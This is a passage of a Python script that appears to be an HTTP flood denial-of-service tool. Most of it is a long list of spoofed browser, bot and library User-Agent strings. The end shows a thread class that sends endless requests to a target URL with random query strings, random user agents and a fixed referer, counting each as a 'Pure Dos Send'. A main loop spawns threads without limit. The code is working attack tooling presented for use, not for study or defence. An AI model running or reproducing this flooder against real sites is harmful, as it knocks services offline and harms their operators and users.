    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-6700; PPC; 240x320)")
    headers.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/5.0 (X11; U; Linux armv6l; en-us) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) tear")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.1; de-de; AT100 Build/HMJ37) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")
    headers.append("NOKIAN95/UCWEB7.0.2.37/28/800")
    headers.append("Vodafone/1.0/HTC_prophet/2.15.3.113/Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; XBLWP7; ZuneWP7)")
    headers.append("Mozilla/5.0 (ZTE-E_N72/N72V1.0.0B02;U;Windows Mobile/6.1;Profile/MIDP-2.0 Configuration/CLDC-1.1;320*240;CTC/2.0) IE/6.0 (compatible; MSIE 4.01; Windows CE; PPC)/UC Browser7.7.1.88")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; BASE lutea Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Cct1)")
    headers.append("Mozilla/2.0 (compatible; MSIE 3.02; Windows CE; 240x320)")
    headers.append("Mozilla/2.0 (compatible; MSIE 3.02; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; MSN Companion 2.0; 800x600; Compaq)")
    headers.append("Mozilla/4.0 (compatible;MSIE 6.0;Windows95;PalmSource) Netfront/3.0;8;320x320")
    headers.append("Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1")
    headers.append("Mozilla/4.74 [en] (X11; I; ProxiNet)")
    headers.append("Mozilla/2.0 (compatible; Elaine/3.0)")
    headers.append("Mozilla/2.0 (compatible; MSIE 3.02; Windows CE; 240x320)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)")
    headers.append("AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)")
    headers.append("Bloglines/3.1 (http://www.bloglines.com)")
    headers.append("Bloglines/3.0-rho (http://www.bloglines.com; 3 subscribers)")
    headers.append("everyfeed-spider/2.0 (http://www.everyfeed.com)")
    headers.append("Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; feed-id=8639390370582375869)")
    headers.append("Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; feed-id=375807642710480585)")
    headers.append("Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; feed-id=1992026586303346733)")
    headers.append("Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; feed-id=13645798864011762265)")
    headers.append("FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)")
    headers.append("GreatNews/1.0")
    headers.append("Gregarius/0.5.2 (+http://devlog.gregarius.net/docs/ua)")
    headers.append("MagpieRSS/0.7 ( http://magpierss.sf.net)")
    headers.append("NFReader/1.4.1.0 (http://www.gaijin.at/)")
    headers.append("UniversalFeedParser/3.3 +http://feedparser.org/")
    headers.append("BinGet/1.00.A (http://www.bin-co.com/php/scripts/load/)")
    headers.append("curl/7.9.8 (i686-pc-linux-gnu) libcurl 7.9.8 (OpenSSL 0.9.6b) (ipv6 enabled)")
    headers.append("curl/7.8 (i386-redhat-linux-gnu) libcurl 7.8 (OpenSSL 0.9.6b) (ipv6 enabled)")
    headers.append("curl/7.7.x (i386--freebsd4.3) libcurl 7.7.x (SSL 0.9.6) (ipv6 enabled)")
    headers.append("curl/7.7.2 (powerpc-apple-darwin6.0) libcurl 7.7.2 (OpenSSL 0.9.6b)")
    headers.append("curl/7.21.4 (universal-apple-darwin11.0) libcurl/7.21.4 OpenSSL/0.9.8r zlib/1.2.5")
    headers.append("curl/7.21.3 (x86_64-unknown-linux-gnu) libcurl/7.21.3 OpenSSL/1.0.0c zlib/1.2.5")
    headers.append("curl/7.21.2 (i386-pc-win32) libcurl/7.21.2 OpenSSL/0.9.8o zlib/1.2.5")
    headers.append("curl/7.21.1 (i686-pc-linux-gnu) libcurl/7.21.1 OpenSSL/1.0.0a zlib/1.2.5")
    headers.append("curl/7.21.0 (x86_64-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18 libssh2/1.2.5")
    headers.append("curl/7.21.0 (x86_64-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18")
    headers.append("curl/7.21.0 (x86_64-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.5")
    headers.append("curl/7.21.0 (x86_64-apple-darwin10.2.0) libcurl/7.21.0 OpenSSL/1.0.0a zlib/1.2.5 libidn/1.19")
    headers.append("curl/7.21.0 (i686-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18")
    headers.append("curl/7.21.0 (i486-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18 libssh2/1.2.6")
    headers.append("curl/7.20.0 (i686-pc-linux-gnu) libcurl/7.20.0 OpenSSL/0.9.8n zlib/1.2.4")
    headers.append("curl/7.20.0 (i386-apple-darwin9.8.0) libcurl/7.20.0 OpenSSL/0.9.8m zlib/1.2.3 libidn/1.16")
    headers.append("curl/7.19.7 (universal-apple-darwin10.0) libcurl/7.19.7 OpenSSL/0.9.8l zlib/1.2.3")
    headers.append("curl/7.19.7 (i486-pc-linux-gnu) libcurl/7.19.7 OpenSSL/0.9.8k zlib/1.2.3.3 libidn/1.15")
    headers.append("curl/7.19.7 (i386-redhat-linux-gnu) libcurl/7.19.7 NSS/3.12.5.0 zlib/1.2.3 libidn/1.9 libssh2/1.2.2")
    headers.append("curl/7.19.7 (i386-apple-darwin9.8.0) libcurl/7.19.7 zlib/1.2.3")
    headers.append("curl/7.19.6 (i686-pc-cygwin) libcurl/7.19.6 OpenSSL/0.9.8n zlib/1.2.3 libidn/1.18 libssh2/1.2")
    headers.append("curl/7.19.6 (i386-redhat-linux-gnu) libcurl/7.19.6 NSS/3.12.4.5 zlib/1.2.3 libidn/1.9 libssh2/1.2")
    headers.append("curl/7.19.6 (i386-pc-win32) libcurl/7.19.6 OpenSSL/0.9.8k zlib/1.2.3")
    headers.append("curl/7.19.5 (i586-pc-mingw32msvc) libcurl/7.19.5 zlib/1.2.3")
    headers.append("curl/7.19.5 (i486-pc-linux-gnu) libcurl/7.19.5 OpenSSL/0.9.8g zlib/1.2.3.3 libidn/1.15")
    headers.append("curl/7.19.4 (universal-apple-darwin10.0) libcurl/7.19.4 OpenSSL/0.9.8k zlib/1.2.3")
    headers.append("curl/7.19.4 (i686-pc-cygwin) libcurl/7.19.4 OpenSSL/0.9.8k zlib/1.2.3 libidn/1.9 libssh2/1.0")
    headers.append("curl/7.19.2 (i386-pc-win32) libcurl/7.19.2 OpenSSL/0.9.8i zlib/1.2.3 libidn/1.11 libssh2/0.18")
    headers.append("curl/7.19.2 (i386-pc-win32) libcurl/7.19.2 OpenSSL/0.9.8c zlib/1.2.3")
    headers.append("curl/7.19.0 (x86_64-suse-linux-gnu) libcurl/7.19.0 OpenSSL/0.9.8h zlib/1.2.3 libidn/1.10")
    headers.append("curl/7.18.2 (x86_64-pc-linux-gnu) libcurl/7.18.2 OpenSSL/0.9.8g zlib/1.2.3.3 libidn/1.8 libssh2/0.18")
    headers.append("curl/7.18.1 (i686-suse-linux-gnu) libcurl/7.18.1 OpenSSL/0.9.8g zlib/1.2.3 libidn/1.8")
    headers.append("curl/7.18.0 (x86_64-pc-linux-gnu) libcurl/7.18.0 OpenSSL/0.9.8g zlib/1.2.3.3 libidn/1.1")
    headers.append("curl/7.17.1 (x86_64-pc-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8g zlib/1.2.3")
    headers.append("curl/7.16.4 (i486-pc-linux-gnu) libcurl/7.16.4 OpenSSL/0.9.8e zlib/1.2.3.3 libidn/1.0")
    headers.append("curl/7.16.3 (powerpc-apple-darwin8.0) libcurl/7.16.3 OpenSSL/0.9.7l zlib/1.2.3")
    headers.append("curl/7.16.2 (x86_64-redhat-linux-gnu) libcurl/7.16.2 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.8")
    headers.append("curl/7.16.1 (i386-pc-win32) libcurl/7.16.1 OpenSSL/0.9.8h zlib/1.2.3")
    headers.append("curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5")
    headers.append("curl/7.15.4 (i686-pc-linux-gnu) libcurl/7.15.4 OpenSSL/0.9.7e zlib/1.2.3")
    headers.append("curl/7.15.3 (sparc64--netbsd) libcurl/7.15.3 OpenSSL/0.9.7d zlib/1.1.4 libidn/0.6.3")
    headers.append("curl/7.15.1 (x86_64-suse-linux) libcurl/7.15.1 OpenSSL/0.9.8a zlib/1.2.3 libidn/0.6.0")
    headers.append("curl/7.15.1 (i486-pc-linux-gnu) libcurl/7.15.1 OpenSSL/0.9.8a zlib/1.2.3 libidn/0.5.18")
    headers.append("curl/7.15.0 (i386-portbld-freebsd5.4) libcurl/7.15.0 OpenSSL/0.9.7e zlib/1.2.1")
    headers.append("curl/7.14.0 (i386-portbld-freebsd5.4) libcurl/7.14.0 OpenSSL/0.9.7e zlib/1.2.1")
    headers.append("curl/7.13.2 (i386-pc-linux-gnu) libcurl/7.13.2 OpenSSL/0.9.7e zlib/1.2.2 libidn/0.5.13")
    headers.append("cURL: curl/7.13.1 (powerpc-apple-darwin8.0) libcurl/7.13.1 OpenSSL/0.9.7b zlib/1.2.2")
    headers.append("curl/7.13.1 (powerpc-apple-darwin8.0) libcurl/7.13.1 OpenSSL/0.9.7l zlib/1.2.3")
    headers.append("curl/7.12.1 (i686-redhat-linux-gnu) libcurl/7.12.1 OpenSSL/0.9.7a zlib/1.2.1.2 libidn/0.5.6")
    headers.append("curl/7.11.1 (i686-redhat-linux-gnu) libcurl/7.11.1 OpenSSL/0.9.7a ipv6 zlib/1.2.1.2")
    headers.append("curl/7.11.1 (i386-redhat-linux-gnu) libcurl/7.11.1 OpenSSL/0.9.7a ipv6 zlib/1.2.1.2")
    headers.append("curl/7.10.6 (i386-redhat-linux-gnu) libcurl/7.10.6 OpenSSL/0.9.7a ipv6 zlib/1.1.4")
    headers.append("Java/1.6.0_26")
    headers.append("Java/1.6.0_13")
    headers.append("Java/1.6.0_12")
    headers.append("Java/1.6.0_11")
    headers.append("Java/1.6.0_04")
    headers.append("Java/1.6.0_03")
    headers.append("Java/1.6.0_02")
    headers.append("Java/1.6.0-beta")
    headers.append("Java/1.5.0_11")
    headers.append("Java/1.5.0_08")
    headers.append("Java/1.5.0_06")
    headers.append("Java/1.5.0_05")
    headers.append("Java/1.5.0_04")
    headers.append("Java/1.5.0_03")
    headers.append("Java/1.5.0_02")
    headers.append("Java/1.5.0_01")
    headers.append("Java/1.5.0")
    headers.append("Java/1.4.2_11")
    headers.append("Java/1.4.2_10")
    headers.append("Java/1.4.2_09")
    headers.append("Java/1.4.2_08")
    headers.append("Java/1.4.2_07")
    headers.append("Java/1.4.2_05")
    headers.append("Java/1.4.2_04")
    headers.append("Java1.4.2_03")
    headers.append("Java/1.4.2_03")
    headers.append("Java/1.4.2_01")
    headers.append("Java/1.4.2")
    headers.append("Java/1.4.1_04")
    headers.append("Java/1.4.1_03")
    headers.append("Java/1.4.1_02")
    headers.append("Java/1.4.1_01a")
    headers.append("Java/1.4.1_01")
    headers.append("Java/1.4.1-p3")
    headers.append("Java/1.4.1")
    headers.append("Java1.4.0_03")
    headers.append("Java1.4.0_02")
    headers.append("Java1.4.0_01")
    headers.append("Java1.4.0")
    headers.append("Java1.3.1_06")
    headers.append("Java1.3.1_04")
    headers.append("Java1.3.1")
    headers.append("Java1.3.0")
    headers.append("Java1.2.2-JDeveloper")
    headers.append("Java1.2.2")
    headers.append("Java1.2.1")
    headers.append("libwww-perl/5.821")
    headers.append("libwww-perl/5.820")
    headers.append("libwww-perl/5.816")
    headers.append("libwww-perl/5.814")
    headers.append("libwww-perl/5.808")
    headers.append("libwww-perl/5.805")
    headers.append("libwww-perl/5.803")
    headers.append("libwww-perl/5.800 (+http://passoire.afraid.org/mylittlewebsurvey/index.html)")
    headers.append("libwww-perl/5.800")
    headers.append("libwww-perl/5.76")
    headers.append("libwww-perl/5.75")
    headers.append("libwww-perl/5.69")
    headers.append("libwww-perl/5.65")
    headers.append("libwww-perl/5.65")
    headers.append("libwww-perl/5.64")
    headers.append("libwww-perl/5.63")
    headers.append("libwww-perl/5.53")
    headers.append("libwww-perl/5.50")
    headers.append("libwww-perl/5.48")
    headers.append("libwww-perl/5.36")
    headers.append("Microsoft URL Control - 6.01.9782")
    headers.append("Peach/1.01 (Ubuntu 8.04 LTS; U; en)")
    headers.append("PHP/5.2.9")
    headers.append("PHP/5.2.8")
    headers.append("PHP/5.2.14")
    headers.append("PHP/5.2.11")
    headers.append("PHP/5.2.10")
    headers.append("pxyscand/2.1")
    headers.append("Python-urllib/3.1")
    headers.append("Python-urllib/3.0")
    headers.append("Python-urllib/2.7")
    headers.append("Python-urllib/2.6")
    headers.append("Python-urllib/2.5")
    headers.append("Python-urllib/2.4")
    headers.append("Python-urllib/2.1")
    headers.append("Python-urllib/2.0a1")
    headers.append("Python-urllib/1.17")
    headers.append("Python-urllib/1.16")
    headers.append("Python-urllib/1.15")
    headers.append("Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)")
    headers.append("Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com)")
    headers.append("Link Valet Online 1.1")
    headers.append("Link Validity Check From: http://www.w3dir.com/cgi-bin (Using: Hot Links SQL by Mrcgiguy.com)")
    headers.append("LinkExaminer/1.01 (Windows)")
    headers.append("Mozilla/5.0 (compatible; LinksManager.com_bot  http://linksmanager.com/linkchecker.html)")
    headers.append("Mozilla/5.0 (compatible; LinksManager.com_bot +http://linksmanager.com/linkchecker.html)")
    headers.append("Mojoo Robot (http://www.mojoo.com/)")
    headers.append("Notifixious/LinkChecker (http://notifixio.us)")
    headers.append("online link validator (http://www.dead-links.com/)")
    headers.append("Ploetz + Zeller (http://www.ploetz-zeller.de) Link Validator v1.0 (support@p-und-z.de) for ARIS Business Architect")
    headers.append("InfoWizards Reciprocal Link System PRO - (http://www.infowizards.com)")
    headers.append("REL Link Checker Lite 1.0")
    headers.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)")
    headers.append("SiteBar/3.3.5 (Bookmark Server; http://sitebar.org/)")
    headers.append("Vivante Link Checker (http://www.vivante.com)")
    headers.append("W3C-checklink/4.5 [4.160] libwww-perl/5.823")
    headers.append("W3C-checklink/4.5 [4.154] libwww-perl/5.823")
    headers.append("W3C-checklink/4.3 [4.42] libwww-perl/5.820")
    headers.append("W3C-checklink/4.3 [4.42] libwww-perl/5.808")
    headers.append("W3C-checklink/4.3 [4.42] libwww-perl/5.805")
    headers.append("W3C-checklink/4.2.1 [4.21] libwww-perl/5.803")
    headers.append("W3C-checklink/4.2 [4.20] libwww-perl/5.803")
    headers.append("W3C-checklink/3.6.2.3 libwww-perl/5.64")
    headers.append("W3C-checklink/2.90 libwww-perl/5.64")
    headers.append("Xenu Link Sleuth 1.2i")
    headers.append("Xenu Link Sleuth 1.2h")
    headers.append("Xenu Link Sleuth 1.2g")
    headers.append("Xenu Link Sleuth 1.2f")
    headers.append("Xenu Link Sleuth 1.2e")
    headers.append("Xenu Link Sleuth 1.2d")
    headers.append("Xenu Link Sleuth 1.2c")
    headers.append("Xenu Link Sleuth 1.2b")
    headers.append("Xenu Link Sleuth/1.3.7")
    headers.append("!Susie (http://www.sync2it.com/susie)")
    headers.append("amaya/11.3.1 libwww/5.4.1")
    headers.append("amaya/11.2 libwww/5.4.0")
    headers.append("amaya/11.1 libwww/5.4.0")
    headers.append("amaya/10.1 libwww/5.4.0")
    headers.append("amaya/10 libwww/5.4.0")
    headers.append("amaya/9.55 libwww/5.4.0")
    headers.append("amaya/9.54 libwww/5.4.0")
    headers.append("amaya/9.52 libwww/5.4.0")
    headers.append("amaya/9.51 libwww/5.4.0")
    headers.append("amaya/8.8.5 libwww/5.4.0")
    headers.append("amaya/11.2 amaya/5.4.0")
    headers.append("amaya/11.1 amaya/5.4.0")
    headers.append("Cocoal.icio.us/1.0 (v43) (Mac OS X; http://www.scifihifi.com/cocoalicious)")
    headers.append("Cocoal.icio.us/1.0 (v40) (Mac OS X; http://www.scifihifi.com/cocoalicious)")
    headers.append("Cocoal.icio.us/1.0 (v38) (Mac OS X; http://www.scifihifi.com/cocoalicious)")
    headers.append("DomainsDB.net MetaCrawler v.0.9.7c (http://domainsdb.net/)")
    headers.append("GSiteCrawler/v1.20 rev. 273 (http://gsitecrawler.com/)")
    headers.append("GSiteCrawler/v1.12 rev. 260 (http://gsitecrawler.com/)")
    headers.append("GSiteCrawler/v1.06 rev. 251 (http://gsitecrawler.com/)")
    headers.append("iTunes/9.1.1")
    headers.append("iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)")
    headers.append("iTunes/9.0.3")
    headers.append("iTunes/9.0.2 (Windows; N)")
    headers.append("itunes/9.0.2 (Macintosh; Intel Mac OS X 10.4.11) AppleWebKit/531.21.8")
    headers.append("iTunes/9.0 (Macintosh; Intel Mac OS X 10.5.8) AppleWebKit/531.9")
    headers.append("iTunes/9.0 (Macintosh; Intel Mac OS X 10.5.8)")
    headers.append("iTunes/9.0")
    headers.append("iTunes/8.2 (Macintosh; U; PPC Mac OS X 10_5_6)")
    headers.append("iTunes/8.1.1 (Windows; U)")
    headers.append("iTunes/8.1.1 (Windows; N)")
    headers.append("iTunes/8.1")
    headers.append("iTunes/8.0")
    headers.append("iTunes/7.6.2.9")
    headers.append("iTunes/7.5 (Macintosh; N; PPC)")
    headers.append("iTunes/7.4.1")
    headers.append("iTunes/7.1.1 (Macintosh; N; PPC)")
    headers.append("iTunes/7.0.1 (Windows; N)")
    headers.append("iTunes/7.0 (Macintosh; U; PPC Mac OS X 10.4.7)")
    headers.append("iTunes/4.8 (Macintosh; U; PPC Mac OS X 10.4.1)")
    headers.append("iTunes/4.7 (Macintosh; U; PPC Mac OS X 10.2)")
    headers.append("iTunes/4.7 (Macintosh; N; PPC)")
    headers.append("iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)")
    headers.append("iTunes/4.0 (Macintosh; U; PPC Mac OS X 10.2)")
    headers.append("lftp/4.3.8")
    headers.append("lftp/4.3.5")
    headers.append("MetaURI API/2.0  metauri.com")
    headers.append("Nitro PDF Download")
    headers.append("Snoopy v1.2")
    headers.append("URD-MAGPIE/0.73 (Cached)")
    headers.append("Mozilla/4.0 (compatible; WebCapture 3.0; Windows)")
    headers.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)")
    headers.append("Mozilla/3.0 (compatible; WebCapture 2.0; Windows)")
    headers.append("Mozilla/3.0 (compatible; WebCapture 1.0; Windows)")
    headers.append("Windows-Media-Player/11.0.5721.5145")
    headers.append("Windows-Media-Player/10.00.00.xxxx")
    headers.append("Windows-Media-Player/10.00.00.4036")
    headers.append("Windows-Media-Player/10.00.00.3646")
    headers.append("Windows-Media-Player/9.00.00.4503")
    headers.append("Windows-Media-Player/9.00.00.3250")
    headers.append("CSE HTML Validator Lite Online (http://online.htmlvalidator.com/php/onlinevallite.php)")
    headers.append("CSSCheck/1.2.2")
    headers.append("Cynthia 1.0")
    headers.append("HTMLParser/1.6")
    headers.append("P3P Validator")
    headers.append("Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0")
    headers.append("W3C_Validator/1.654")
    headers.append("W3C_Validator/1.606")
    headers.append("W3C_Validator/1.591")
    headers.append("W3C_Validator/1.575")
    headers.append("W3C_Validator/1.555")
    headers.append("W3C_Validator/1.432.2.5")
    headers.append("W3C_Validator/1.432.2.22")
    headers.append("W3C_Validator/1.432.2.19")
    headers.append("W3C_Validator/1.432.2.10")
    headers.append("W3C_Validator/1.305.2.12 libwww-perl/5.64")
    headers.append("WDG_Validator/1.6.2")

    return headers


def ascii(size):
    out_str = ''

    for e in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)

    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                #print ("\033[1;32m Attacking Website \033[1;m")
                req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
                #req = urllib2.Request(url)
                req.add_header("User-Agent", random.choice(useragent()))
                #req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
                req.add_header("Referer", referer)
                urllib2.urlopen(req)
                count += 1
                print ("{0} Pure Dos Send".format(count))
            except urllib2.HTTPError:
                print ("\033[1;34m SERVER MIGHT ME DOWN \033[1;m")
                pass
            except urllib2.URLError:
                print ("\033[1;34m URL ERROR \033[1;m")
                sys.exit()
            except ValueError:
                print ("\033[1;34m [-] Check You're URL \033[1;m")
                sys.exit()
            except KeyboardInterrupt:
                exit("\033[1;34m [-] Canceled By User \033[1;m")
                sys.exit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("\033[1;34m [-] Canceled By User \033[1;m")
